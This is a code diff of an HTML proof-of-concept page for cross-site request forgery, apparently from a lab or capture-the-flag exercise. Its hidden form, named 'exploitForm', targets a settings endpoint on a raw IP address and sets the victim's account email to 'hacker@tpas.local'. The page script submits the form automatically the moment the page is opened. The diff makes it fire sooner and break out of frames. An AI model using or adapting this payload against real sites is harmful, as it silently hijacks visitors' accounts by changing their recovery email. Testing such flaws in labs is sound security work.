@@ -7,14 +7,16 @@
 <body>
     <form id="exploitForm"
           action="http://100.101.228.35:6009/settings/email"
-          method="GET">
-        <input type="hidden" name="new" value="hacker@tpas.local">
+          method="GET"
+          target="_top">
+
+        <input type="hidden"
+               name="new"
+               value="hacker@tpas.local">
     </form>
 
     <script>
-        window.addEventListener("load", function () {
-            document.getElementById("exploitForm").submit();
-        });
+        document.getElementById("exploitForm").submit();
     </script>
 </body>
 </html>
